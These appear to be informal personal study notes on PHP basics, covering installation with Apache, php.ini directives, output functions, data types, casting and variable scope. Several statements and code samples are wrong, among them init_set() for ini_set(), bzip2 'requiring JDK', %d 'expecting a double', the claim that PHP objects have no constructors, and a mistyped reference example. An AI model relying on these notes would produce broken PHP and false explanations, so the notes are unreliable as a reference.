The general pattern of syntax for PhP is as follows:

<?php echo date("F j, Y"); ?> //This will print out September 23:rd, 2007

PhP is a loosely typed language. This means that we do not explicitly have to refer to things or declare things, nor we do have to explicitly destroy them.
PhP fixes this itself. We don't have to explicitly typecast things, either.

Also, what follows, is an example of PhP producing a random string of 5 alphanumerical characters (such as ex: a3jh8):

$randomString = substr(md5(microtime()), 0, 5);

To showcase that PhP is a loosely typed language, what follows, is an example to illustrate this:

<?php
	$number = "5"; //$number is now a string
	$sum = 15 + $number; 	//add a integer and string to produce a int
	$sum = "twenty"; 		//overwrite $sum with a String
?>

PhP reallocates memory resources taken up by the completion of the Script.

PhP, beyond interacting with DB's, manipulating form info and create pages dynamically, it can also:

Create and manipulate PDF files.

Evaluate a passwords strength, against language dicts and easily broken patterns

Parse even the most complex of strings using the POSIX and Perl regex libs.

Authenticate users against login creds stored in flat files, DB's, and MS Active Dir.

Can communicate with a wide variety of protocols, such as LDAP, IMAP, POP3, NNTP, DNS and others.

Tightly integrated with a wide array of credit-card processing solutions.

PhP Also integrates something called PEAR. PEAR is the PHP Extension and Application Repository, which has
a very wide array of installable open source projects.

PhP supports about 25+ DB's, including mySql, SQL and Oracle.

It allows for easy porting from Perl/Python to PhP, by virtue of processing their language, as both have a similar
functionality to Python.

PhP uses Apache, and is almost always accompanied to most Linux setups.

Note: Building PhP from Source, is not adviced, on the Windows platform.

To install Apache and PHP on linux, we need root privleges, at least Perl 5.003, Flex and Bison.

First, we have to unpack the downloaded tar.gz. After that, we can go to the dir where we installed it:

%>cd httpd-2_X_XX
%>./configure --enable-so [other options] //--enable causes apache to be able to load shared modules
%>make

Then we must install Apache:

%>make install //Requires install privs

We then must configure build and install PhP, as follows:

%>cd ../php-X_XX
%>./configure --with-apxs2=APACHE_INSTALL_DIR/bin/apxs [other options]
%>make
%>make install

NOTE: In the above example. APACHE_INSTALL_DIR is a placeholder for Apache's installed location, such as /usr/local/apache2

PhP comes bundeled with a config file called php.ini. - It was originally named php.ini-dist.

You need to copy this file to a appropiate location and rename it to php.ini. We can put it anywhere we want, but if we don't adhere
to it's intended place, we need to modify PhP using the --with-config-file-path option 

There is a second set of settings for PhP as well, which is called php.ini-recommended, which serves to attempt to optimize and secure
your installation. Albeit, this config may not be fitting for legacy apps.

To use this file, we can use the following commands:

%>cp php.ini-recommended /usr/local/lib/php.ini

We must then open Apache's Config file, and verify that the following lines exists: NOTE: if they do not exist, add them, put em alongside the other LoadModule and AddType entries:

LoadModule php5_module modules/libphp5.so
AddType application/x-httpd-php .php

The final step is then to restart the Apache server, with the following command:

%>/usr/local/apache/bin/apachetl restart

When we make a setup on windows, we get a installer, do the normal steps, feed in localhost on the connections, our email on email.

We can change the values of these things, later, in the httpd.conf file.

For windows, we enter the httpd.conf file and add the following lines:

LoadModule php_module c:/php/php5apache2_2.dll
AddType 	application/x-httpd-php .php
PHPIniDir 	"c:\php"

We must then rename our php.ini-dist file to php.ini and save it to the C:\php dir 

As of 5.3+ the INIT files have been reorganized and renamed as php.ini-development and php.ini-production
We just have to choose one of these to rename and roll with it, depending on the context we have.

There is, beyond this, one more file for default config, which is php.ini-recommended. This file sets
non-standard behaviour.

Historically, PhP has been standard to deploy unto Linux machines, for safety and stability.

The best way to see if PhP has installed correctly, we can give a simple php command in a text file, as follows:

<?php
	phpinfo();
?>

Save this file as phpinfo.php. If we are running Apache, we save it to the htdocs dir.

If we are running a MS server, we save it to C:\inetpub\wwwroot

The next step, is that we open a browser and write the following, to test and see if our server is able to run:

http://localhost/phpinfo.php 

If we get a error message that it's been disabled for security reasons, we can run a slightly different php script, as follows:

<?php
	echo "A simple but effective PHP test!";
?>

NOTE: Executing phpinfo() gives a rather verbose response about a lot of stuff, like extensions, PhP installation and OS.

If we manage to run it, but there are no particular errors that occured and we recieve no output, the following is a list of what can be wrong:

We have to restart Apache to have effects take place.

Invalid characters or incorrect statements will cause Apache's restart statement to fail. If apache won't start, go back and review your changes.

Verify that any-PhP-enabled file ends in the same PHP-specific extension as defined in the httpd.conf file. For example, if you've defined only
.php as the recognizable extension, don't try to embed a PhP code into a .html file

Make sure to follow formatting of the <?php ?> format.

You created a file named index.php and trying to call it, failingly so due to calling it as a default dir index file.
However, Apache only recognizes index.html as the standard, so to achieve the desired effect, we need to add index.php to Apache's Dir index directive

If we wish to find a full list of command related to PhP on Linux, we could run the --help command as follows:

%>./configure --help //There are about 200+ flags for modifications

What follows, are two examples of accessing the PhP Configuration file and modifying it, so that it enables FTP functionality and Bzip2 extensions:

%>./configure --with-apxs2=/usr/local/apache/bin/apxs --enable-ftp //Enables ftp

%>./configure --with-apxs2=/usr/local/apache/bin/apxs \
>--with-bz2=[INSTALL-DIR]

Note: Just cause you flag something in PhP, does not mean it makes it available. It might take a bit more than just that. Also, when you flag to enable
a certain utility, you must have the respective software that helps to be responsible for said thing. Such as bzip requiring JDK.

Windows have 45 extensions bundeled with it's release, and to activate them, we have to do the following:

Open the php.ini file and locate the extensions_dir dir and assign it C:\php\ext. If you installed PhP in another dir, modify this path
accordingly.

Locate the line ;extension=php_xmlrpc.dll - uncomment it by removing the preceeding ; and save the file. (in PhP, a ; is a comment marker)

Then, we restart the webserver and the extension is ready for use from within PhP. Keep in mind, that some extensions have additional
config dirs that may be found later in the php.ini file.

When enabling said extensions, sometimes we need to install the relevant software to boot, to accompany the extension.

There are a lot of configs that we can apply to PhP through the php.ini file, Apache's httpd.conf and .htaccess files, and directly through a PhP script.

PhP distribution comes with two files, as is shown : php.ini-dist and php.ini-recommended ; In later times, they have been renamed to
php.ini-development and php.ini-production. 

For starting out, we should use the latter, because it has already default set a lot of the commonly used settings to recommended settings.

There is one file for each respective thing, that holds the global fields, which is as follows:

php.ini is for the global settings of PhP.

httpd.conf is for the global settings of Apache.

The file is divided into 12 sections, that are as follows:

Language options

Safe Mode

Syntax Highlightning

Misc

Resource Limits

Error Handling and Logging

Data Handling

Paths and Dirs

File Uploads

Fopen Wrappers

Dynamic Extensions

Module Settings

The php.ini file consists of comments followed by settings.

An example follows:

;
; Allow the <? tag
;
Short_open_tag = Off

Exactly when changes take effect, depends on how you install PhP. if PhP is installed as a CGI binary, the php.ini file is reread every time PHP is invoked,thus
making them instant.

If PhP is installed as a Apache module, then php.ini is only read in once, when the Apache daemon is first started. In this case, you must restart Apache for any
of the changes to take effects.

When PHP is running as an Apache module, you can modify many of the directives through either the httpd.conf file or the .htaccess file. This is accomplished by
prefixing directive/value assignment with one of the following keywords:

php_value : Sets the value of the specified directive

php_flag : Sets the value of the specified boolean directive

php_admin_value : Sets the value of the specified directive. This differs from php_value in that it cannot be used within an .htaccess file and cannot be overridden
within virtual hosts or .htaccess

php_admin_flag : Sets the value of the specified directive. This differs from php_value in that it cannot be used within an .htaccess file and cannot be overridden within
virtual hosts or .htaccess.

For example, to turn off short tags directive and prevent others from overriding it, add the following line, to the httpd.conf file:

php_admin_flag short_open_tag Off

The third, and most local setting of modifying PhP settings, is to set it in the actual script we are running. We do this with init_set() in the beginning of a script:

init_set('max_execution_time', '60'); //Sets the max execution time of a script to 60 seconds

Configuration directives, can only be modified in their respective scope. There is 4 scopes, in total, as follows:

PHP_INI_PERDIR : Directive can be modified within the php.ini, httpd.conf, or .htaccess files

PHP_INI_SYSTEM : Directive can be modified within the php.ini and httpd.conf files.

PHP_INIT_USER : Can be modified within user scripts

PHP_INIT_ALL : Directive can be modified anywhere

What follows, is the core config directives of PhP, in the order that they appear in the php.ini file:

NOTE: The following default values are relevant for the php.ini-development file, and are relevant for that context: This is just some of the values most commonly used, not all:

Name 						Scope 					Default 		Desc

engine 						PHP_INI_ALL 			On 				Defines if the PhP Engine is available. If you turn this off, you can't use PhP at all.

zend.zel_compability_mode   PHP_INI_ALL 			Off 			Decrepid, Removed in 5.3+

short_open_tag 				PHP_INI_ALL 			Off 			The enclosing syntax in PhP has 4 different formats, the shortest is <? //stuff ?>, this
																	modifies wether they are allowed or not. When on, allows for them, if off, they do not work

asp_tags 					PHP_INI_ALL 			Off 			PhP supports ASP-style script delimeters, which looks like: <% //stuff %>. If this is turned on, they continue
																	being a legit delimeter. If not, they are not.

precision = <int> 			PHP_INI_ALL 			14 				This is the amount of precision numbers for float. 12 on win32, 14 on Linux, is default. 

y2k_compliance 				PHP_INI_ALL 			On 				Should be on, for all intents and purposes

output_buffering 			PHP_INI_SYSTEM 			4096 			There sometimes occurs a bug when the info has been sent and the Coder attempts to change the info, to which 																		they are denied. To fix this bug, we can enable this, and also limit the size of which the buffer is, for 
																	everything to be sent at once, when that is the time for that. NOTE: Has a slight performance hit.
																	The solution to the bug, is to simply pass the info before any other content, if possible.

output_handler 				PHP_INI_ALL 			NULL 			Tells PhP to send output through this function upon output. For example, assume we would want to compress info
																	before sending it out - Then we could use this, as follows: output_handler = "ob_gzhandler", this will compress
																	the output before it's sent out. NOTE: You CANNOT actiave the ob_gzhandler as the handler AND have 
																	zlib.output_compression at the same time.

zlib.output_compression 	PHP_INI_SYSTEM 			Off 			Enabling this, causes compression of data before it's sent back ; Saving Time and Bandwith.
																	We can also give this a integer argument, to define a compression buffer's size

zlib.output_handler 		PHP_INI_SYSTEM 			NULL 			Defines a specific compression library, if the zlib library is not available.

implicit_flush 				PHP_INI_SYSTEM 			Off 			Clears the buffer after each call to print() or echo(). Useful when there is a really long period of calculation

unserialize_callback_func 	PHP_INI_ALL 			100 			Allows to control response to undfined classes. Irrelevant in a lot of cases, due to PhP's Error reporting
																	already does this, if tuned fine enough

serialize_precision 		PHP_INI_ALL 			100 			Sets the range of numbers after the . point for dec and float when they are serialized. Settings this to a 
																	appropiate number, allows for no loss of data upon serialization and unserialization

allow_call_time_\ 			PHP_INI_SYSTEM 			Off 			Arguments to functions can be called both by number and by reference. If this is enabled, we enforce the calling
pass_reference 														in such a way, that it must be called with reference.

There is a Safe mode, but 5.3+ caused it to be deprecated, and should not be used.

I will list the safe mode things, at any rate. NOTE: DO NOT USE:

safe_mode 					PHP_INI_SYSTEM 			Off 			Enables safemode ; turns off chmod(), chown(), chgrp(), exec(), parse_ini_file(), system() and backtick operators
																	Also enforces, that the user running this script, must target scripts that are owned by said user. This is why
																	safe_mode is not really used.

safe_mode_gid 				PHP_INI_SYSTEM 			Off 			When safe mode is enabled, an enabled safe_mode_gid enforces a GID (group ID) check when opening files.
																	when disabled, the UID (user id) check is run instead.

safe_mode_include_dir 		PHP_INI_SYSTEM 			NULL 			The safe_mode_include_dir provides a safe haven from the UID/GID checks when safemode is on - When this is on,
																	UID/GID checks are ignored when opened from the designated dir that this one is assigned to

safe_mode_exec_dir 			PHP_INI_SYSTEM 			NULL 			Restricts function execution in given dir through exec() command. Example: safe_mode_exec_dir = "/usr/local/bin"

safe_mode_allowed_env_vars  PHP_INI_SYSTEM 			PHP 			Defines which OS system-level vars can be modified through PHP scripts. If blank, allows PhP mod on all 
																	An example of how to restrict to PhP starting files: safe_mode_allowed_env_vars = "PHP "

safe_mode_protected_\       PHP_INI_SYSTEM 			LD_LIBRARY_PATH prevents modification of specified variables. An example: safe_mode_protected_env_vars = "PATH"
env_vars 

open_basedir 				PHP_INI_SYSTEM 			NULL 			open_basedir defines a place of which where all file operations are restricted to. This prevents users from
																	entering areas they should not. For example, assume that we would want to limit anyone from going anywhere but /home/www, then we could give open_basedir the following value: open_basedir = "/home/www"

disable_functions 			PHP_INI_SYSTEM 			NULL 			In certain environments, you may want to completely disallow the use of certain default functions, such as
																	exec() and system(). Such functions can be disabled by assigning them to the disable_functions parameter, like this: disable_functions = "exec, system";

disable_classes 			PHP_INI_SYSTEM 			NULL 			Disables the specified classes.

ignore_user_abort 			PHP_INI_ALL 			Off 			If enabled, ignores user sent AND browser sent request of interupption

Syntax can be highlighted in PhP and customized.

There are a few ways we could enable syntax highlightning, which is as follows:

Give the php file the extension of .phps

show_source()

highlight_file()

To use the .phps extension, we need to add the following line to the httpd.conf:

AddType application/x-httpd-php-source .phps

We can assign colours to strings, comments, keywords, background, default text, HTML components - on a RGB scale, hexa scale, or keyword, as follows:


rgb(0,0,0)

#000000

black

All the above are valid values to get the colour of black on something.

What follows is the listing of where we can define the values for said variables:

name 				Scope 				Default 			Desc

highlight.string 	PHP_INI_ALL 		#DD0000 			colour of highlighted string

highlight.comment 	PHP_INI_ALL 		#FF9900 			colour of highlighted comment

highlight.keyword 	PHP_INI_ALL 		#007700 			colour of highlighted keyword

highlight.bg 		PHP_INI_ALL 		#FFFFFF 			colour of the background

highlight.default 	PHP_INI_ALL 		#0000BB 			colour of default text

highlight.html 		PHP_INI_ALL 		#000000 			Default highlighting of html elements

In terms of having a server, Apache will broadcast the following info with each response header by default:

Apache/2.2.0 (Unix)  PHP/5.3.0 PHP/5.3.0-dev Server at www.example.com Port 80 

If we wish to disable this, we can do so by the expose_php attribute, which is as follows:

expose_php 			PHP_INI_SYSTEM 		On 					Shows a signature info about the server ; Disable, for security reasons

We can disable Apache's broadcast of it's server signature by setting ServerSignature to Off in the httpd.conf file.

In terms of PhP, we have to assure that we do not overconsume resources. There are three areas, that are relevant to contraint, as follows:

Execution time of scripts

script input processing time

memory

Each can be controlled via the following three directives:

name 					Scope 				Default 			Desc
max_execution_time 		PHP_INI_ALL         30 					External commands do not count towards this limit ; This limit is the amount of seconds
																a script is allowed to run. Setting this to 0, defines no limit.

max_input_time 			PHP_INI_ALL 		60 					Defines the upper limit for parsing input files. Especially relevant in uploading large files.

memory_limit 			PHP_INI_ALL 		128M 				The max amount of MB that can be allocated to a script.

So far, we have covered EXTERNAL variables, such as received from cookies, from GET, POST, the OS, Scripts, and the Server.
What follows, is a list of things that affects PHP's default char set, PhP's default MIME type, and wether 
external files will be automatically prepended or appended to PHP's returned output.

name  					Scope 				Default 			Desc

arg_separator.output  	PHP_INI_ALL 		&amp; 				PhP is capable of automatically generating URLs and uses the standard & to seperate input vars.
																We can override this, however, by using the arg_separator.output directive.

arg_seperator.input 	PHP_INI_ALL 		;&; 				The & value is the default to seperate input vars passed from POST or GET methods. 
																Should you need to overwrite them, it can be done here.

variable_order 			PHP_INI_ALL 		GPCS 				Defines the order of which ENVIRONMENT, GET, POST, COOKIE and SERVER vars are processed.
																if register_globals is on (not recommended), the ordering of these values could be
																unexpected, as one could end up overwriting an earlier given argument

register_globals 		PHP_INI_SYSTEM 		Off 				Deprecated due to Major Security flaws

register_long_arrays 	PHP_INI_SYSTEM 		Off 				Deprecated due to performance issues

register_argc_argv 		PHP_INI_SYSTEM 		Off 				Passing in information via the GET method is analogous to passing args to a Exec.
																Many languages process such as in terms of argc and argv, where argc is
																the count of arguments, and argv is the indexed array of commands.
																To mimic this functionality, turn this On.

post_max_size 			PHP_INI_SYSTEM 		8M 					For security reasons, we can set the max size in terms of how much data we send with
																POST messaging

To assert that we get the result we wish to get, in terms of " and 's, we should always esacpe them with \ notations.

name 					Scope 				Default 			Desc

magic_quotes_gpc 		PHP_INI_SYSTEM 		Off 				Determines wether magic quotes are enabled for data transmission via the GET, POST and cookie
																methods. When enabled, all single and double quotes, backslashes and null chars are auto
																matically escaped with a \

magic_quotes_runtime 	PHP_INI_ALL 		Off 				Enabling this, cause all returned data from external sources to be escaped with \, if there is any ' or "

magic_quotes_sybase 	PHP_INI_ALL 		Off 				Only relevant if magic_quotes_runtime is on and if we use a Sybase DB, which uses ' to escape instead of \

auto_prepend_file 		PHP_INI_SYSTEM 		NULL 				Creating page header templates or including code libs before a PHP script is executed is most commonly done
																using the include() or require() function. You can automate this process and forgo the inclusion of these
																functions within your scripts, by assigning the file name and coresponding path to the auto_prepend_file 

auto_append_file 		PHP_INI_SYSTEM 		NULL 				Automatically inserting footer templates after a PHP script is executed is most commonly done using the
																include() or require() functions. You can automate this process and forgo the inclusion of these
																functions within your scripts, by assigning the template filename and correspoding path to the
																auto_append_file

default_mimetype 		PHP_INI_SYSTEM 		text/html 			MIME types offer a standard means for classifying file types on the internet. You can serve any
																of these files types via PHP applications, the most common of which is text/html. If you're using
																PHP in other fashions, however, such as content generator for WML (Wireless Markup Language) apps
																you need to adjust the MIME type accordingly. You can do so by modifying the default_mimetype
																directive.

default_charset 		PHP_INI_ALL 		NULL 				As of version 4.0, PHP ouputs a character encoding in the Content-Type header. By default this is
																set to iso-8859-1, which supports langauges such as English, Spanish, German, Italian, and Portugese
																among others. If your application is geared towards languages such as Japanese, Chinese or Hebrew,
																however, the default_charset directive allows you to update this char set setting accordingly.

always_populate_\ 		PHP_INI_PERDIR 	Off 				Enabling the always_populate_raw_post_data directive causes PHP to assign a String consisting of
raw_post_data  													POSTed name/value pairs to the variable $HTTP_RAW_POST_DATA, even if the form variable has no
																corresponding value. For example, suppose this directive is enabled and you create a form
																consisting of two text fields, one for the user's name and another for the user's e-mail adress.
																In the resulting form action, you execute just one command:

																echo $HTTP_RAW_POST_DATA;

																Filling out neither field and clicking submit, will yield :

																name=&email=

																Filling out both fields and clicking submit will yield:

																name=jason&email=jason%40example.com

What follows, is a listing that revolves around modifying the default PhP path ; This means libs, extensions, web dirs, web document roots:

name 					Scope 				Default 			Desc

include_path 			PHP_INI_ALL 		NULL 				The path to which this parameter is set serves as the base path used by function such as include(),
																require() and fopen_with_path(). You can specify multiple dirs by seperating each with a semicolon.
																A example follows: include_path=".:/usr/local/include/php;/home/php"

																By default this parameter is set to the path defined by the environment variable PHP_INCLUDE_PATH.
																NOTE: On windows, backward slashes are used instead of / for path declarations, as follows:

																include=".;C:\php\includes"

doc_root 				PHP_INI_SYSTEM 		NULL 				This parameter determines the default from which all PHP scripts will be served. This parameter is used only
																if it is not empty.

user_dir 				PHP_INI_SYSTEM 		NULL 				The user dir directive specifies the absolute dir PHP uses when opening files using the /~username convention.
																For example, when user_dir is set to /home/users and a user attempts to open the file 
																~/gillmore/collections/books.txt, PhP knows that absolute path is /home/users/gillmore/collections/books.tx

extension_dir 			PHP_INI_SYSTEM 		./ (LINUX) 			The extension_dir directive tells PhP where its loadable extensions (modules) are located. By default this is
											ext (WINDOWS) 		set to ./, which means that the loadable extensions are located in the same dir as the executing script.
																NOTE ON WINDOWS: If it's not set, it defaults to C:\PHP-INSTALLATION-DIR\ext\

enable_dl 				PHP_INI_SYSTEM 		Off 				The enable_dl() function allows a user to load a PHP extension at run time-that is, during a script's execution

What follows, are modifications that are relevant for access and manipulation of remote files:

allow_url_fopen 		PHP_INI_ALL 		On 					Enabling allow_url_fopen allows PHP to treat remote files almost as if they were local.
																When enabled, a PhP script can access and modify files residing on remote servers,if the files
																have correct permissions.

from 					PHP_INI_ALL 		NULL 				The title of the from directive is misleading ; It's to determine the PW of a anonymous user
																used to perform FTP connections. An example:
																from = "jason@example.com"

																This will pass the usernam anonymous and the pw jason@example.com to the server, when
																authentication is requested

user_agent 				PHP_INI_ALL 		NULL 				PHP always sends a content header along with its processed output, including a user agent attribute.
																This directive determines the value of that attribute

default_socket_timeout 	PHP_INI_ALL 		60 					This directive determines the time-out value of a socket-based stream, in seconds.

auto_detect_line_\ 		PHP_INI_ALL 		Off 				One never-ending source of developer frustration comes from EOL chars, due to different
endings 				 										OS's using different conventions. This auto-detects wether the data read by fgets() and file()
																uses Mac, MS-DOS or Linux file conventions.

Past this, we have one more directive, which is regarging extensions:

extension 				PHP_INI_ALL 		NULL 				The extension directive is used to dynamically load a particular module. On the win23 operating
																System, a module might be loaded like this:

																extension = php_bz2.dll

																On unix, it would be:

																extension = php_bz2.so

																NOTE: Keep in mind, we still have to have the extension installed to use it.

There are a number of Code Editors to choose from for PhP, as follows:

Adobe Dreamweaver CS5 (cost 400$) (Good support)

Notepad++ (Free, Windows only, Slim support)

PDT (Eclipses IDE for PHP, Free?)

Zend Studio (Most powerful, cost 400$)

Sublime Text Editor 3 (Go with 3)

Netbeans (Usable for PhP)

A number of questions we should ask ourselves about Server providers, when we do PhP, is:

Is PhP supported, and if so, what version?

Is MySQL/Oracle/PostgreSQL suppported, if so, what version?

What PhP file extensions are supported? Some providers force deprecated versions of php such as phtml ; Only .php should be considered valid

What restrictions are placed upon PHP scripts? Sometimes providers put extra demands or special settings that can conflict with interests

What restrictions are put upon Apache .htaccess files? Not all providers allow modification of the .htaccess file which can be vital

What PhP software does the provider give?

Does the hosting support all my needs?

PhP has the standard lineup of control structures, except a few more, such as include, require and declare.

PhP uses the C and C++ style of commenting on code.

To make sure what code the PhP engine is to process, we delimit our code, which tells the Engine which is PhP sections and not.
There are four ways to delimit PhP designations in PhP, as follows:

Default:

<h3>Welcome lol!</h3>
<?php
	echo "<p>Some dynamic output here</p>";
?>
<p>Some static output here</p>

If we save this script as test.php and excute it from a PhP enabled web server, we'll see a output of the things above.

Short-Tag:

<?
	print "this is another PHP EXAMPLE";
?>

NOTE: DO NOT USE SHORT TAGS FOR REDISTRIBUTION INTENDED SOFTWARE - Since Short Tags need to be enabled to be used, it's not include in Redistributed intended PhP scripts

If Short-Tag is activated, we can further more do a Short-circuit version, as follows:

<?="This is another PhP example.";?> 

The above, is the same as both of the following:

<? echo "This is another PhP example."; ?>
<?php echo "this is another PhP example.";?>

Script:

Since some editors have had problems with the way PhP code is escaped, a new more "friendly" version was introduced:

<script language="php">
	print "This is another PhP example.";
</script>

ASP: //NOTE: DEPRECATED, STOPPED BEING AVAILABLE SINCE 5.3

There is also the Microsoft ASP variant, as follows:

<%
	print "This is another PhP example.";
%>

Note: the Script variant are rarely used, and must have special reason to find justification for it's usage.

We can escape to and from PhP as often as we please, as follows:

<html>
	<head>
		<title><?php echo "Welcome to my website!";?></title>
	</head>
	<body>
		<?php
			$date = "July 26, 2010";
		?>
		<p>Today's date is <?=$date;?></p>
	</body>
</html>

Code from earlier blocks are remember for later, as per the example with $date.

There are several ways to comment your code in PhP, as follows:

Single line C++ Syntax:

//This is a comment
//We can just put in comments like this

Shell Syntax:

Akin to another form of commenting, in C++, that is called Shell Syntax, is supported in PhP, as follows:

#This is also a way to comment
#lololololo

There are several more advanced ways of having documentation of PhP code, such as phpDocumentor (www.phdoc.org) - Where we can analyze
the code to find certain DocBlocks, that allows us to conver the code to things like HTML or PDF's.

Further more, we can do multi-line comments with the C syntax:

/*
	This is some documentation
	hello hi lol im a comment
	me too!
	OH SHIT
	HERES THE END
	NOOOOOOOOOOOO
*/

We can put out information to the console in different ways, much like other languages, PhP is no different:

We have the print(<argument>), which prints the info on the screen.

Print, however, is not a normal function, it's a language construct. As thus, we can forgoe the usage of (), because it's not a function.

What follows, is some examples of using the print construct:

<?php
	print("<p>I love the summertime!.</p>");
?>

<?php
	$season = "Summertime";
	print "<p>I love the $season.</p>";
?>

<?php
	print "<p>I love the
	summertime.</p>";
?>

All of the above, works, and produces the line of : "I love the summertime."

Also, the return type of print, in PhP, is always 1.

We can also output info with the echo statement, which allows for several strings, as we'll see now:

echo(<string1>,<string2>,...)

We can call echo without the (), if we wish, as follows:

echo "I love the summertime!";

What follows, is an example of using echo to output several strings:

<?php
	$heavyweight = "Lennox Lewis";
	$lightweight = "Floyd Mayweather";
	echo $heavyweight, " and ", "$lightweight", " are great fighters";
?>

As we can see, we can output several arguments with echo and we can follow them up with , seperations to define them as to be seperate args

Technically speaking, echo is faster, because it's return type is void, compared to that of print's return type of 1, but it's neglectable.

We also have the printf() statement, which is great, because it gives greater control of formatting and also seperates static and dynamic data.
It's general syntax is as follows:

integer printf(string format [, mixed args])

For example, as we come to expect from printf:

printf("Bar Inventory: %d bottles of tonic water.", 100);

Executing it, gives the normal output : Bar inventory: 100 bottles of tonic water.

Anything that is not Numeric, is discarded from typeholder variables of Printf, and further more, if what remains would be "nothing", it resorts to the 
default value of said type of variable, so numeric becomes 0. Also, PhP rounds down on Double to int conversion.

What follows, is the list of placeholder (% arguments) for PhP:

%b : Considered as a int, expects Binary

%c : Considered as a int, presented as a char corresponding to that ASCII value

%d : Considered as a int, expects a double

%f : Considered a float, presented as a floating-point number

%o : Considered a int, presented as a octal number

%s : Considered a String, presented as a String

%u : Considered a int, presented as a unsigned decimal numeral

%x : Considered a int, presented as a lowercase hexadecimal number

%X : Considered a int, presented as a uppercase hexadecimal number

The interaction of different type is as expected, where it takes based on ordering:

printf("%d bottles of tonic water cost $%f", 100, 43.20);

It will give the output of:

100 bottles of Tonic Water, cost $43.20000 

To moderate the amount of decimals we get past the . point, we can do the expected, as follows:

printf("$%.2f", 43.2); // $43.20 is the output. the .2 preceeding the f defines how many trailing numbers we allow past the . point

There's a number of other arguments as well, such as for padding, sign and width. 

There is a second type of printf in PhP, called sprintf - Which means that we return the value of the printed string to a String variable, instead
of actually printing it out, as follows:

$cost = sprintf("$%.2f", 43.2); // $cost = $43.20

We have the normal setup of types in PhP. We also have the concept of scalar data types and Compound ones. (Scalar is singular, Compound is plural):

The scalar ones, are as follows:

Boolean : True or False, !1 (True) or 0 False.

Integer : PhP supports 2^31 range of Int, PhP6 supports 2^63

Float : can be declared as per normal, or rasied to the power of with e (8.7e4 or 1.23E+11)

String : Allowed to get reference info based on indexing

Compoung Data Types, are data types that are plural:

Arrays: PhP supports multidimensional arrays and hold reference info on a different level, as is shown: $state["Alabama"] = "Montgomery"; 
//NOTE: In the above example, Alabama is assigned to hold it's capital, Montgomery. This showcases the differing of apart form just the indexing, that arrays allow.

Objects: They are as per usual, except slightly different. What follows, is a showcasing of calling methods on a Object after having declared the class for it:

class Applicance {
	private $_power;
	function setPower($status) {
		$this->_power = $status; //NOTE: When we assign values in PhP, explicit declaration, we do the -> notation to refer to what their containing value is
	}
}  
...
$blender = new Applicance; //Calling a instanciation of a object is done with new, except no () are used, as the object in PhP does not have a constructor per say.

$blender ->setPower("on"); //Call the setPower method from the blender assigned variable

in PhP, we have typcasting supported, as follows:

Cast Operators 					Conversion

(array) 						Array

(bool) or (boolean) 			Boolean

(int) or (integer) 				Integer

(object) 						Object

(real) or (double) or (float) 	Float

(string) 						String

Some interesting facts about casting in PhP:

Casting a string to a int, results in 0.

Casting a value to an array, spawns a new array with that value as the first one in the element. //NOTE: Since it works like this, DO NOT, cast values to attempt to "add" them to
//arrays, because it will return a new array and it will delete the old one.

$sentence = "This is sentence";
echo (int) $sentence; //returns 0

$score = 1114;
$scoreboard = (array) $score;
echo $scoreboard[0]; //outputs 1114, like stated, DO NOT USE THIS METHOD FOR APPENDING TO ARRAYS, IT WILL OVERWRITE THE ARRAY

Interesting fact:

Anything in PhP can be typecast to an object. If done so, it will become a attribute of the Object, called scalar, as follows:

$model = "Toyota";
$obj = (object) $model;

print $obj->scalar; //Returns "Toyota"

What follows, is some examples of PhP's "Type Juggling", as is:

<?php
	$total = 5; //An int
	$count = "15"; //a String
	$total += $count; // $total = 20 (int)
?>

<?php
	$total = "45 fire engines";
	$incoming = 10;
	$total = $incoming + $total; // $total = 55
?>

In the above example, the String value gets scrapped due to arithmetics, if it started with anything but numeral, however, it'd be accounted for as 0, resulting in 10

<?php
	$total = "1.0";
	if ($total) echo "We're in positive territory!";
?>

In the above example, a String value get converted into a Boolean, which results in true, due to the fact of that it's not 0.

<?php
	$val1 = "1.2e3"; // 1,200
	$val2 = 2;
	echo $val1 * $val2; //outputs 2400
?>

In the above example, due to the fact of that the power to notation is part of the String, the value gets accounted for as being a numeral.
This only occurs if the String is involved in a arithmetic operation

There are a number of functions that are related to types, as follows:

string gettype(mixed var) : It returns the type of the provided var, which can be any of the following: array, boolean, double, integer, object, resource, string, unknown

Boolean settype(mixed var, string type) : Converts a var to the specified type, returns TRUE if successful, FALSE otherwise.

There is also the list of finding a match against what type it is, as follows:

is_array() : Checks to see if it's an array, if so, returns 1, 0 otherwise

is_bool() : For boolean

is_float() : For Float

is_integer() : For int

is_null() : For Null

is_numeric() : For Numerals

is_object() : For objects

is_resource() : For resources

is_scalar() : For scalar

is_string() : For string

What follows, is an example of such checks:

<?php
	$item = 43;
	printf("The variable \$item is of type array: %d <br />", is_array($item)); //NOTE: the \ escaping here, defines the $ as literal, not making variable expansions
	printf("The variable \$item is of type integer: %d <br />", is_integer($item));
	printf("The variable \$item is numeric: %d <br />", is_numeric($item));
?>

It produces the following:

The variable $item is of type array: 0
The variable $item is of type integer: 1
The variable $item is of type numeric: 1

Identifiers in PhP, is the general term used for Variables, Functions and various other user-defined objects.

They follow a number of rules, as per usual:

They are case sensitive.

They can be any length.

Cannot be identical to PhP keywords.

A identifier must consist of letters, numbers, underscore chars, and other ASCII chars.

They cannot begin with a number.

Valid 					Invalid
my_function 			This&That

Size 					!counter

_someword 				4ward

Variables ïn PhP begin with a $, followed by var name.

In PhP, we have individual values for each respective variable, as per to be expected - But with a twist:

Normally variables in PhP hold a copy of the reference to something, to make several variables point to the one and same
variable, as in making any change of one of the standing vars to reflect change in the actual referenced var, we can append the
& in declaration.

What follows, is an illustration of this:

<?php
	$value1 = "Hello";
	$value2 =& $value1; //connects value2 to reference the same instance as value1
	$value = "goodbye"; //value1 and value2, now both, become goodbye
?>

An alternative to this, is also just straight up appending the & to the var in question, as follows:

<?php
	$value1 = "Hello";
	$value2 = &$value1;
	$value2 = "Goodbye";
?>

Just as per usual, we define a context to which the var is relevant. In PhP, we have 4 different scopes:

Local

Function Parameter

Global

Static

As per come to be expected, values declared in a method are local, as the following example showcases:

$x = 4;
function assignX () {
	$x = 0;
	printf("\$x inside function is %d <br />", $x); //Escaping the $ causes it to be literal
}
assignX();
printf("\$x outside of function is %d <br />", $x); //we escape the $ to cause it to be literal
}

The output is as we expect, 0 for inside the method, 4 for outside

In PhP, instance values are destroyed when we exit said instance.

Beyond this, in PhP, whenever we intend to use a instance variable, we have to declare them in the header. (in the argument list)

When it comes to global values, we have the same rules as per Python, that we declare them to be global in the first line of the argument, as follows:

$somevar = 15;

function addit(){
	global $somevar;
	$somevar++; //NOTE: If we would omit the global declaration, somevar would initialize to 0, and we'd end up with 1, because we add to it
